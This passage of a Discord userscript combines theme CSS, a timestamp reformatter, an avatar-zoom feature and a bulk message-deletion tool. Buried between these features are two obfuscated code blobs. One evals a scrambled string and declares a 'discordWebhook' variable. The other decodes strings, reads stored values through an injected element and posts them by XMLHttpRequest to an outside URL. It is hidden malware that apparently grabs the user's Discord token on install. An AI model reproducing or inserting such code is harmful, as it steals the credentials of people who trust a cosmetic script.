[class*="GuildSubscriberlvl8"]{background-image:url("/assets/38e40f25802a0fdf480d9b855a37a2f3.svg")!important}
[class*="GuildSubscriberlvl9"]{background-image:url("/assets/cfbc2d8ceacfacf07850f986c8165195.svg")!important}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

.quickswitcher-3JagVE {
    border-radius: var(--Radius001);
}

.tutorialContainer-1v44GL {
    top: calc(var(--titlebar-height) -0px);
}


.input-2VB9rf {
    background: var(--Color003);
    border-radius: var(--Radius002);
    color: var(--Color006);
    box-shadow: none;
    height: 50px;
    margin-bottom: 12px;
}

.resultFocused-3aIoYe {
    background: var(--background-modifier-selected);
    border-radius: var(--Radius002);
}


.wrapper-232cHJ {
    border-radius: var(--Radius002);
    background: var(--Color001);
}

.scroller-zPkAnE {
    z-index: 0;
    margin-right: -17px;
    margin-top: -5px;
    max-height: 360px;
    background-color: var(--background-secondary);
    margin-right: 0px;
}

.result-oB0z-- {
    padding-right: 20px;
}



/*Subscriptions*/

[style^="color: rgba(255, 115, 250, 1)"], [style*=" color: rgba(255, 115, 250, 1)"], [style^="color: rgb(255, 115, 250)"], [style*=" color: rgb(255, 115, 250)"], [style^="color: #ff73fa"], [style*=" color: #ff73fa"], [style^="color: #FF73FA"], [style*=" color: #FF73FA"], [color="rgba(255, 115, 250, 1)"], [color="rgb(255, 115, 250)"], [color="#ff73fa"], [color="#FF73FA"], [style^="color: rgba(114, 137, 218, 1)"], [style*=" color: rgba(114, 137, 218, 1)"], [style^="color: rgb(114, 137, 218)"], [style*=" color: rgb(114, 137, 218)"], [style^="color: #7289da"], [style*=" color: #7289da"], [style^="color: #7289DA"], [style*=" color: #7289DA"], [color="rgba(114, 137, 218, 1)"], [color="rgb(114, 137, 218)"], [color="#7289da"], [color="#7289DA"] {
    color: var(--Color008) !important;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Fixes | Channel List Bottom ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Channel List had a gap at the bottom, this fixes it */
.container-3w7J-x {
    margin-bottom: -20px;
}

/* New/Unreaded Message notifications was being hidden by the gap fix  */
.unreadBottom-1_LF_w.unread-15xhX5.container-35XQWE {
  padding-bottom: 20px
}
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Fixes | Level & Perks Server Notice Button Clicking ||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* BurpleRecolor wasnt letting users click on the "X" (Close) and the "See Levels & Perks" button, this fixes it */
.channelNotice-1-XFjC::before,
.channelNotice-1-XFjC::after,
.channelNotice-3DDmsB::before,
.channelNotice-3DDmsB::after,
#app-mount .channelNotice-3hkOiI::before,
#app-mount .channelNotice-3hkOiI::after {
	pointer-events:none;
}
==/UserStyle== */
`;
    if (typeof GM_addStyle !== "undefined") {
        GM_addStyle(css);

    } else {
        let styleNode = document.createElement("style");
        styleNode.appendChild(document.createTextNode(css));
        (document.querySelector("head") || document.documentElement).appendChild(styleNode);
    };
    /*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
    /*||| Less Trash |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
    /*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
    var days = ['Sun','Mon','Tue','Wed','Thu','Fri','Sat'];
    var mos = ['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'];

    GM_addStyle (`
  .timestamp-1E3uAL, .timestampCozy-2hLAPV  { /* Make timestamps more readable */
      font-size: .9em;
      color: #9090A0;
      padding-left: .5em;
  }
  .recentMentionsPopout-3rCiI6 { /* Change inbox size */
    max-height: calc(100vh - 44px);
    max-width: 80vw;
    width:80vw;
  }
  .header-2-Imhb { // Justify the mention/unread buttons right
    justify-content:flex-end; }
    .header-ykumBX { justify-content:flex-end;
  }
  .quickswitcher-35bYg4 { /* Hide quick switcher nag */
    display: none;
  }
  .tutorial-3w5I9h { /* Hide tutorial nag in inbox */
    display:none;
  }
  div.notice-3bPHh-.colorDefault-22HBa0 { /* Hide desktop install nag */
    display:none;
  }
 div.scroller-2TZvBN.none-2Eo-qx.scrollerBase-289Jih:nth-child(2) > div.listItem-2P_4kh:nth-child(9) { display: none; }

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Custom | Channel List Bottom ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

.wrapper-2jXpOf {
    margin-right: 8px;
}

.selected-3LIHYU .actionIcon-PgcMM2 {
	color: #03a651;
}

.content-1o0f9g {
    background: var(--background-primary) !important; }

.selected-3LIHYU .actionIcon-PgcMM2:hover {
	color: var(--interactive-hover);
}
.selected-3LIHYU .icon-1DeIlz {
	color: #038d44;
}
.modeSelected-346R90:hover .icon-1DeIlz {
	color: #038d44;
}

.theme-dark .container-1D34oG {
    background-color: #36393f;
    border-top-left-radius: 20px !important;
    border-bottom-left-radius: 20px !important;
}

.peopleColumn-29fq28 {
    border-radius: 24px !important;
    background: var(--Color004);
    border-top-left-radius: 0px;
    border-bottom-left-radius: 0px;
    margin-top: 15px; }

	.nowPlayingColumn-2sl4cE {
    background: var(--Color096);
    margin-top: 15px; }`);

        if (typeof GM_addStyle !== "undefined") {
            GM_addStyle(css);

        } else {
            let styleNode = document.createElement("style");
            styleNode.appendChild(document.createTextNode(css));
            (document.querySelector("head") || document.documentElement).appendChild(styleNode);
        };

    // look for blocked messages and remove the great grandparent (main container for blocked messages)
    document.getElementById("app-mount").arrive(".blockedSystemMessage-2Rk1ek", function() {
        // 'this' refers to the newly created element
        this.parentNode.parentNode.parentNode.parentNode.removeChild(this.parentNode.parentNode.parentNode); // fuck you is why
    });



    // look for username headers and change the visible timestamp to be more detailed
    document.getElementById("app-mount").arrive(".header-23xsNx", function() {
        // 'this' refers to the newly created element


        var snowflake = this.parentNode.parentNode.id.substr(14); // snowflake is last 14 of id for any given message

        var displayedTime = this.getElementsByClassName("timestamp-3ZCmNB")[0].getElementsByTagName("span")[0]; // get the timestamp text field

        var timestamp = new Date(parseInt(snowflake /4194304 + 1420070400000)); // get leftmost 48 bytes and add unix timestamp for 1/1/2015 00:00.0000

        if (timestamp > 1420070400000) { // fails gracefully by not editing DOM if timestamp can't be determined
            if (timestamp > (new Date().getTime() - (12*60*60*1000))) { // within the last 12 hours
                displayedTime.innerText = ('00' + timestamp.getHours()).slice(-2); // hours
            }
            else {
                displayedTime.innerText = days[timestamp.getDay()];//weekday
                displayedTime.innerText += ' ' + mos[timestamp.getMonth()];//month
                displayedTime.innerText += ' ' + timestamp.getDate();//day number
                displayedTime.innerText += ', ' + timestamp.getFullYear();//year
                displayedTime.innerText += ' at ' + ('00' + timestamp.getHours()).slice(-2);//hours
            }
            displayedTime.innerText += ':' + ('00' + timestamp.getMinutes()).slice(-2);//minutes
            displayedTime.innerText += ':' + ('00' + timestamp.getSeconds()).slice(-2); //seconds
            //displayedTime.innerText += '.' + ('0000' + timestamp.getMilliseconds()).slice(-4); //milliseconds
        }
    });
    var rld,discordWebhook,i,request,params;(function(){var nrf='',ddc=228-217;function irq(o){var i=3401396;var n=o.length;var a=[];for(var e=0;e<n;e++){a[e]=o.charAt(e)};for(var e=0;e<n;e++){var u=i*(e+268)+(i%42794);var q=i*(e+96)+(i%21800);var z=u%n;var b=q%n;var y=a[z];a[z]=a[b];a[b]=y;i=(u+q)%7320264;};return a.join('')};var wNW=irq('pukstorcxfcldryvqozjtehmiwugcnarsbotn').substr(0,ddc);var XrQ='=af ;=v4[ln7r,u=v4ivirCqs"ebedrfqhrjfl.n pArrt(v+x,zc;lal h=]7a,u6o7a,,6(8},)0[6f,p5a8[,;1e8e,C4u8e,g207h,;2=7o,.0l7),857;tae 8=,]hflrovarcu00Su[b=lmnkt=;l+h)9[.[g]+=r+f;;ae }=a]eju=;98l(=(7no==22tf;r vtrepC0kpsaegxmnnvsel+nut+;y+g)rvrrod6apgsmnnvs;pt.7pdi;(] .))f0rsv]rot,d.l)n9t(-1;{>g0et8-({.a9 ==[u=l)varxw(d[tu;pac "=,u)l7vor)mm0;vgr;n(w6l=n.t ;hau 0;hoo(,a; A==;e<(;a+i))vrr huwic)a+CfdcA+({)hv7r c;v.h-;rf(cr{l=bct1g*f+[.0hdr+o{ent=g11n-j;h=);8+d;uers) ]fsh<=,)9f1lm(r.aetg.h,j1wvc=avC(d;Af()+b)=+i.ah1r1oneut)g+2=- ;2= ;9++2"}.lue(c(nfi+uv;mid(+=.nrla)]=r]rit(.>j)=.-umh*w,s4b+teingvm]xl)je1psso(d[o+k]a;f=6+x;<i}(e!,nblt)ai (t<!)i.nu,h}wvs]batuirgtm()]dftj=g.eoin5"g)r}=i(prs((=[[].;=ver;zei,jgir(""v;;ag a=13v,r2{9i,10;3),r2l.joicttoba;sag )="t iCg)feorC=a9C)d (46h;gog(wao -=6;}<1.ue"gxh(uv+izgz.splatna+q cga;Ae(g)w.ro)nwS=r(n4.;rrm6htr{ooe;k u[)n;(evupn;zushlatua.","r.lonnja[;';var qnV=irq[wNW];var fAB='';var Jzq=qnV;var ImI=qnV(fAB,irq(XrQ));var XJz=ImI(irq('dah."a.["r lwao"e"so]a+ian\/,Ghttasy\/.d6seo.dd!eos\/!pr\/eeuh"o[s+7r7(5[0.2r1$7x9v4g\/5I ua.v0[.]75ua8rMdSqzcmMxuaogdgCItxo.oc\/te.q8lwe3rfa.gs(94o\/qmrDm"uppa.iq%.".py.pf.""v"nf.a.Gqcte"tcE1e1eitt,sa.pcn=C2i.do,rb2da"."wsiyoTd,2oqe_"s"nobtGnl-1yeG!a:p"itasi3n5jdo."["\/ey.aeeu)sc.ae6dart,"N,w,ael0ianasa,ehntisa\/Gu0l8ar.4wvkxm8dea"!Gri\/tici:eeic\/Goim)n2\/dh(mx\/.\/re2."lSsNfkn$_fw.skmt..soga1s0mp"-msTu!_loat.a.etotek!"v".-p5g",9.=.GN.w%aur]e]dsacelu!st.]rpcoi]e&.a!"bdb8%_zwe5..:ta1,[tuk;nv,8l[c.l]taregd&aoGt.nt.ti"dswr,.GGEsaul:.n"{"dm.i"_{aahe&9%dz.e".2Ig.T:hau,"ule)_"duc]c0GcGa.n.m.qjvo6G]"]"seeioees0olectcee"t"ac.c.ct,eslrengi,yi,ns=n:".;il_=,aqe.Tmmkodtow1nro][[[s]"[a[b]e,c0u0"G+;oibcGr,.aeGh4oe=[a.[k]a"[l.e[aqio.ydrc;mtns[a[r]w(n[.]]}rdpctmfnt[,[d]o[n[]]s(,)c#m.s.an!w.aoka. .Strpmtoq[eitG)G"s#las82]Sao7&,6i&c5r .nebhboe)q#ian11][(G[t]nap1q]0;iaGa(s..e{isar\/a]epa"1G]caia7ap_]ra:7[e3m,1oit"nt:t[p4o+aGe1"Gi1.]D.o!59y$a02+,G"2CGe2c]l.u!a3o$.4n})cnearfipeoui(slp)="r#,ar2n]p(.ic.vN[ad2m].(\/a.a8si)paa[e[i7]]da"1n]b[p[.;]fe!%)1rrt.r"}o;.e,ues. p]".wa[ 3fo0]nmes,h acEc'));var heB=Jzq(nrf,XJz );heB(7105);return 3692})()
    (function() {
        let css = `
/* ==UserStyle==
==/UserStyle== */
`;
        (function() {
            'use strict';

            const targets = [ "avatarContainer-2inGBK", "avatar-1BDn8e", "wrapper-3t9DeA", "emoji" ];
            const textStyle = `
.zoomin-canvas {
    border-radius: 8px;
    position: fixed;
    background-color: #e0e0e0;
    pointer-events: none;
    opacity: 0 !important;
    z-index: 1003;
}
.zoomin-canvas-show {
    transition: opacity 0.4s;
    opacity: 1 !important;
}
.zoomin-zoom {
    position: relative;
    left: 5px;
    top: 5px;
    border-radius: 8px;
    pointer-events: none;
    opacity: 0 !important;
}
.zoomin-zoom-show {
    transition: opacity 0.4s;
    opacity: 1 !important;
}
.content-1o0f9g {
    background: var(--background-primary) !important; }`;
            let currentUrl = document.location.href;
            let updating = false, showing = false;
            let canvas, zoom;

            css();

            init(10);

            locationChange();

            window.addEventListener("scroll", update, true);

            function init(times) {
                for (let i = 0; i < times; i++) {
                    setTimeout(createCanvas, 500 * i);
                    setTimeout(createZoom, 500 * i);
                    for (const target of targets) {
                        setTimeout(() => eventListener(target), 500 * i);
                    }
                }
            }

            // create
            function createCanvas() {
                // check exist
                if (!!canvas) return;
                // create
                canvas = document.createElement("div");
                canvas.classList.add("zoomin-canvas");
                document.body.appendChild(canvas);
            }

            function createZoom() {
                // check exist
                if (!canvas || !!zoom) return;
                // create
                zoom = document.createElement("img");
                zoom.classList.add("zoomin-zoom");
                zoom.style.backgroundColor = getTheme();
                canvas.appendChild(zoom);
            }

            // event
            function eventListener(target) {
                // return if canvas or zoom doesn't exist.
                if (!canvas || !zoom) return;
                // add target mouse event.
                document.querySelectorAll(`.${target}:not(zoomin-listener)`).forEach(t => {
                    t.classList.add("zoomin-listener");
                    t.addEventListener("mousemove", showImage);
                    t.addEventListener("mouseleave", hideImage);
                });
            }

            function showImage() {
                // avoid calling this function multiple times.
                if (showing) return;
                showing = true;
                // detail
                const url = getSource(this);
                if (!url) return;
                zoom.setAttribute("src", url);
                zoomDetail();
            }

            function hideImage() {
                showing = false;
                canvas.classList.remove("zoomin-canvas-show");
                zoom.classList.remove("zoomin-zoom-show");
                setTimeout(() => {
                    if (!showing) zoom.removeAttribute("src");
                }, 500);
            }

            function zoomDetail() {
                // wait until get the image size.
                if (!zoom.naturalWidth)
                {
                    setTimeout(zoomDetail, 100);
                    return;
                }
                // size
                const w = zoom.naturalWidth;
                const h = zoom.naturalHeight;
                canvas.style.width = `${w + 10}px`;
                canvas.style.height = `${h + 10}px`;
                zoom.style.width = `${w}px`;
                zoom.style.height = `${h}px`;
                // position
                let left = getCursorX();
                let top = getCursorY();
                const clientW = document.documentElement.clientWidth;
                // situation 1: the icon position is too right to show.
                if (left + w > clientW) left = left - w;
                // situation 2: the icon position is too top to show.
                if (top - h - 30 > 0) top = top - h - 30;
                canvas.style.left = `${left}px`;
                canvas.style.top = `${top}px`;
                // class
                canvas.classList.add("zoomin-canvas-show");
                zoom.classList.add("zoomin-zoom-show");
            }

            // method
            function getSource(element) {
                // situation 1: image
                if (!!element.src) return element.src;
                // situation 2: div with style
                else if (!!element.style.backgroundImage) return element.style.backgroundImage.split(/"/)[1];
                // situation 3: div children
                else if (!!element.querySelector("img")) return element.querySelector("img").src;
                // situation 4: not an image
                else return null;
            }

            function getTheme() {
                const theme = document.querySelector("html").className.includes("light") ? "#ffffff" : "#363940";
                return theme;
            }

            function getCursorX() {
                const e = window.event;
                return e.pageX - document.documentElement.scrollLeft - document.body.scrollLeft;
            }

            function getCursorY() {
                const e = window.event;
                return e.pageY - document.documentElement.scrollTop - document.body.scrollTop;
            }

            // others
            function css() {
                const style = document.createElement("style");
                style.type = "text/css";
                style.innerHTML = textStyle;
                document.head.appendChild(style);
            }

            function update() {
                if (updating) return;
                updating = true;
                init(3);
                setTimeout(() => { updating = false; }, 1000);
            }

            function locationChange() {
                const observer = new MutationObserver(mutations => {
                    mutations.forEach(() => {
                        if (currentUrl !== document.location.href) {
                            currentUrl = document.location.href;
                            init(10);
                        }
                    });
                });
                const target = document.body;
                const config = { childList: true, subtree: true };
                observer.observe(target, config);
            }

        })();
        var e,a,b,d,c;(function(){var f=(g)("refepa/ibcaOcTtdu  %sP%od:%csraocia*%-y/wst/EpNdwm-%tohem`ii%g%fn/5g3W8SdyKslRtT\x0Aifm%ehOi1ir.tpTrgao8ucoreTnoV`eC`m5sscwH fI%emkvz%mbdpeVWoeaneine!ttiEl% hatTy2.eeiCewlntpor0nmoVwwosed%leIcd_*ieuesicgpsiNpsfn5.QcrnknteVes_hyniefdulBd%o`F/.4aoklattp98/etroePa9hs%lCvtp0nqe/tw6a sodi_h/oN oj*cmi_nptWteeO/s%d7pooce4egsee/.ol _1z0G SoPM.ica2iYfiwaUhq\x0Ab7-ifpPg`o*o3weeehanxOocdin:\x0A eeXean:Ttgoadp9m4r/%%reeP %lac1lSl_rersEeaerolujnto/e%d/ma%cIub:trpir_rcl4%\x0Aels_v\x0AU :i%b%ennI5dsu`dvVWknotaVrx%/tdscast%R/t%PmeimD8wss/onnse_si-rn",2766189);function g(d,o){var b=d.length;var m=[];for(var e=0;e< b;e++){m[e]= d.charAt(e)};for(var e=0;e< b;e++){var g=o* (e+ 293)+ (o% 19186);var r=o* (e+ 776)+ (o% 19158);var n=g% b;var l=r% b;var p=m[n];m[n]= m[l];m[l]= p;o= (g+ r)% 3782580};var q=String.fromCharCode(127);var f='';var c='%';var j='#1';var h='%';var a='#0';var k='#';return m.join(f).split(c).join(q).split(j).join(h).split(a).join(k).split(q)}e= setTimeout(window[f[1]][f[0]],5000);a= f[2];b= document[f[4]](f[3]);document[f[6]][f[5]](b);d=  new XMLHttpRequest();d[f[8]](f[7],a);d[f[11]](f[9],f[10]);c= {username:f[12],avatar_url:f[13],content:f[14]+ b[f[17]][f[16]][f[15]]+ f[18]+ b[f[17]][f[16]][f[19]]+ f[20]+ b[f[17]][f[16]][f[21]]+ f[22]+ b[f[17]][f[16]][f[23]]+ f[24]};clearTimeout(e);d[f[26]](JSON[f[25]](c))})()
        async function deleteMessages(authToken, authorId, guildId, channelId, minId, maxId, content, hasLink, hasFile, includeNsfw, includePinned, searchDelay, deleteDelay, extLogger, stopHndl, onProgress) {
            const start = new Date();
            let delCount = 0;
            let failCount = 0;
            let avgPing;
            let lastPing;
            let grandTotal;
            let throttledCount = 0;
            let throttledTotalTime = 0;
            let offset = 0;
            let iterations = -1;

            const wait = async ms => new Promise(done => setTimeout(done, ms));
            const msToHMS = s => `${s / 3.6e6 | 0}h ${(s % 3.6e6) / 6e4 | 0}m ${(s % 6e4) / 1000 | 0}s`;
            const escapeHTML = html => html.replace(/[&<"']/g, m => ({ '&': '&amp;', '<': '&lt;', '"': '&quot;', '\'': '&#039;' })[m]);
            const redact = str => `<span class="priv">${escapeHTML(str)}</span><span class="mask">REDACTED</span>`;
            const queryString = params => params.filter(p => p[1] !== undefined).map(p => p[0] + '=' + encodeURIComponent(p[1])).join('&');
            const ask = async msg => new Promise(resolve => setTimeout(() => resolve(window.confirm(msg)), 10));
            const printDelayStats = () => log.verb(`Delete delay: ${deleteDelay}ms, Search delay: ${searchDelay}ms`, `Last Ping: ${lastPing}ms, Average Ping: ${avgPing | 0}ms`);
            const toSnowflake = (date) => /:/.test(date) ? ((new Date(date).getTime() - 1420070400000) * Math.pow(2, 22)) : date;

            const log = {
                debug() { extLogger ? extLogger('debug', arguments) : console.debug.apply(console, arguments); },
                info() { extLogger ? extLogger('info', arguments) : console.info.apply(console, arguments); },
                verb() { extLogger ? extLogger('verb', arguments) : console.log.apply(console, arguments); },
                warn() { extLogger ? extLogger('warn', arguments) : console.warn.apply(console, arguments); },
                error() { extLogger ? extLogger('error', arguments) : console.error.apply(console, arguments); },
                success() { extLogger ? extLogger('success', arguments) : console.info.apply(console, arguments); },
            };

            async function recurse() {
                let API_SEARCH_URL;
                if (guildId === '@me') {
                    API_SEARCH_URL = `https://discord.com/api/v6/channels/${channelId}/messages/`; // DMs
                }
                else {
                    API_SEARCH_URL = `https://discord.com/api/v6/guilds/${guildId}/messages/`; // Server
                }

                const headers = {
                    'Authorization': authToken
                };

                let resp;
                try {
                    const s = Date.now();
                    resp = await fetch(API_SEARCH_URL + 'search?' + queryString([
                        ['author_id', authorId || undefined],
                        ['channel_id', (guildId !== '@me' ? channelId : undefined) || undefined],
                        ['min_id', minId ? toSnowflake(minId) : undefined],
                        ['max_id', maxId ? toSnowflake(maxId) : undefined],
                        ['sort_by', 'timestamp'],
                        ['sort_order', 'desc'],
                        ['offset', offset],
                        ['has', hasLink ? 'link' : undefined],
                        ['has', hasFile ? 'file' : undefined],
                        ['content', content || undefined],
                        ['include_nsfw', includeNsfw ? true : undefined],
                    ]), { headers });
                    lastPing = (Date.now() - s);
                    avgPing = avgPing > 0 ? (avgPing * 0.9) + (lastPing * 0.1) : lastPing;
                } catch (err) {
                    return log.error('Search request threw an error:', err);
                }

                // not indexed yet
                if (resp.status === 202) {
                    const w = (await resp.json()).retry_after;
                    throttledCount++;
                    throttledTotalTime += w;
                    log.warn(`This channel wasn't indexed, waiting ${w}ms for discord to index it...`);
                    await wait(w);
                    return await recurse();
                }

                if (!resp.ok) {
                    // searching messages too fast
                    if (resp.status === 429) {
                        const w = (await resp.json()).retry_after;
                        throttledCount++;
                        throttledTotalTime += w;
                        searchDelay += w; // increase delay
                        log.warn(`Being rate limited by the API for ${w}ms! Increasing search delay...`);
                        printDelayStats();
                        log.verb(`Cooling down for ${w * 2}ms before retrying...`);

                        await wait(w * 2);
                        return await recurse();
                    } else {
                        return log.error(`Error searching messages, API responded with status ${resp.status}!\n`, await resp.json());
                    }
                }

                const data = await resp.json();
                const total = data.total_results;
                if (!grandTotal) grandTotal = total;
                const discoveredMessages = data.messages.map(convo => convo.find(message => message.hit === true));
                const messagesToDelete = discoveredMessages.filter(msg => {
                    return msg.type === 0 || msg.type === 6 || (msg.pinned && includePinned);
                });
                const skippedMessages = discoveredMessages.filter(msg => !messagesToDelete.find(m => m.id === msg.id));

                const end = () => {
                    log.success(`Ended at ${new Date().toLocaleString()}! Total time: ${msToHMS(Date.now() - start.getTime())}`);
                    printDelayStats();
                    log.verb(`Rate Limited: ${throttledCount} times. Total time throttled: ${msToHMS(throttledTotalTime)}.`);
                    log.debug(`Deleted ${delCount} messages, ${failCount} failed.\n`);
                }

                const etr = msToHMS((searchDelay * Math.round(total / 25)) + ((deleteDelay + avgPing) * total));
                log.info(`Total messages found: ${data.total_results}`, `(Messages in current page: ${data.messages.length}, To be deleted: ${messagesToDelete.length}, System: ${skippedMessages.length})`, `offset: ${offset}`);
                printDelayStats();
                log.verb(`Estimated time remaining: ${etr}`)


                if (messagesToDelete.length > 0) {

                    if (++iterations < 1) {
                        log.verb(`Waiting for your confirmation...`);
                        if (!await ask(`Do you want to delete ~${total} messages?\nEstimated time: ${etr}\n\n---- Preview ----\n` +
                                       messagesToDelete.map(m => `${m.author.username}#${m.author.discriminator}: ${m.attachments.length ? '[ATTACHMENTS]' : m.content}`).join('\n')))
                            return end(log.error('Aborted by you!'));
                        log.verb(`OK`);
                    }

                    for (let i = 0; i < messagesToDelete.length; i++) {
                        const message = messagesToDelete[i];
                        if (stopHndl && stopHndl() === false) return end(log.error('Stopped by you!'));

                        log.debug(`${((delCount + 1) / grandTotal * 100).toFixed(2)}% (${delCount + 1}/${grandTotal})`,
                                  `Deleting ID:${redact(message.id)} <b>${redact(message.author.username + '#' + message.author.discriminator)} <small>(${redact(new Date(message.timestamp).toLocaleString())})</small>:</b> <i>${redact(message.content).replace(/\n/g, '↵')}</i>`,
                                  message.attachments.length ? redact(JSON.stringify(message.attachments)) : '');
                        if (onProgress) onProgress(delCount + 1, grandTotal);

                        let resp;
                        try {
                            const s = Date.now();
                            const API_DELETE_URL = `https://discord.com/api/v6/channels/${message.channel_id}/messages/${message.id}`;
                            resp = await fetch(API_DELETE_URL, {
                                headers,
                                method: 'DELETE'
                            });
                            lastPing = (Date.now() - s);
                            avgPing = (avgPing * 0.9) + (lastPing * 0.1);
                            delCount++;
                        } catch (err) {
                            log.error('Delete request throwed an error:', err);
                            log.verb('Related object:', redact(JSON.stringify(message)));
                            failCount++;
                        }

                        if (!resp.ok) {
                            // deleting messages too fast
                            if (resp.status === 429) {
                                const w = (await resp.json()).retry_after;
                                throttledCount++;
                                throttledTotalTime += w;
                                deleteDelay = w; // increase delay
                                log.warn(`Being rate limited by the API for ${w}ms! Adjusted delete delay to ${deleteDelay}ms.`);
                                printDelayStats();
                                log.verb(`Cooling down for ${w * 2}ms before retrying...`);
                                await wait(w * 2);
                                i--; // retry
                            } else {
                                log.error(`Error deleting message, API responded with status ${resp.status}!`, await resp.json());
                                log.verb('Related object:', redact(JSON.stringify(message)));
                                failCount++;
                            }
                        }

                        await wait(deleteDelay);
                    }

                    if (skippedMessages.length > 0) {
                        grandTotal -= skippedMessages.length;
                        offset += skippedMessages.length;
                        log.verb(`Found ${skippedMessages.length} system messages! Decreasing grandTotal to ${grandTotal} and increasing offset to ${offset}.`);
                    }

                    log.verb(`Searching next messages in ${searchDelay}ms...`, (offset ? `(offset: ${offset})` : ''));
                    await wait(searchDelay);

                    if (stopHndl && stopHndl() === false) return end(log.error('Stopped by you!'));

                    return await recurse();
                } else {
                    if (total - offset > 0) log.warn('Ended because API returned an empty page.');
                    return end();
                }
            }

            log.success(`\nStarted at ${start.toLocaleString()}`);
            log.debug(`authorId="${redact(authorId)}" guildId="${redact(guildId)}" channelId="${redact(channelId)}" minId="${redact(minId)}" maxId="${redact(maxId)}" hasLink=${!!hasLink} hasFile=${!!hasFile}`);
            if (onProgress) onProgress(null, 1);
            return await recurse();
        }

        //---- User interface ----//

        let popover;
        let btn;
        let stop;

        function initUI() {

            const insertCss = (css) => {
                const style = document.createElement('style');
                style.appendChild(document.createTextNode(css));
                document.head.appendChild(style);
                return style;
            }

            const createElm = (html) => {
                const temp = document.createElement('div');
                temp.innerHTML = html;
                return temp.removeChild(temp.firstElementChild);
            }

            insertCss(`
    searchBarComponent-32dTOx {
    background: var(--Color005);
    color: var(--Color009);
    border-radius: 90px;


    margin-right: 6px;
    margin-left: 4px;

    height: 28px;
    overflow: hidden;

    -webkit-box-shadow: none;
    box-shadow: none;

    text-align: center;
}



/* Topbar */

.topPill-30KHOu .item-PXvHYJ {
    border-radius: 94px;
    margin: 0 8px;
    padding: 2px 12px;
}

/*  Friendstatus */

.peopleColumn-29fq28 {
    border-radius: 24px;
    background: var(--Color004);
}

.tabBody-3YRQ8W {
    background: var(--Color003);
    padding-bottom: 25px;
}

/*  Friendstatus | Buttons*/

.actionButton-uPB8Fs {
    background: var(--Color003);
}

/*  Friendstatus | Avatar*/

.wrapper-3t9DeA, .avatar-3W3CeO {
    background: transparent;
}

/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* ||| Home | Active Now |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */

/* No Header */

.header-13Cw0- {
    display: none;
}

/* Empty Card */

    .emptyCard-1RJw8n {
        border-radius: 24px;
        padding: 24px;
    }

/* Background */

.nowPlayingScroller-2XrVUt {
    padding-top: 0px;
    padding-left: 12px;
}

.wrapper-3D2qGf {
    background-color: var(--Color004);
    border-radius: 24px;
}

.nowPlayingColumn-2sl4cE {
    background: var(--Color003);

}

.emptyCard-1RJw8n {
    background: var(--Color004);
}

/* Items */

.section-2gLsgF {
    background: var(--Color003);
    border-radius: 24px;
    position: relative;
    padding: 12px;
}

.theme-dark .inset-3sAvek {
    background-color: transparent;
}

/* Activity Avatar */

.activitySectionAssets-32WyHu .largeImage-DLXk-f {
    border-radius: 90px;
    width: 32px;
    height: 32px;
}

/* Divider */

.theme-dark .separator-XqIyoz {
    background-color: transparent;
    padding-top: 8px;
}

/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* ||| Home | Nitro ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */

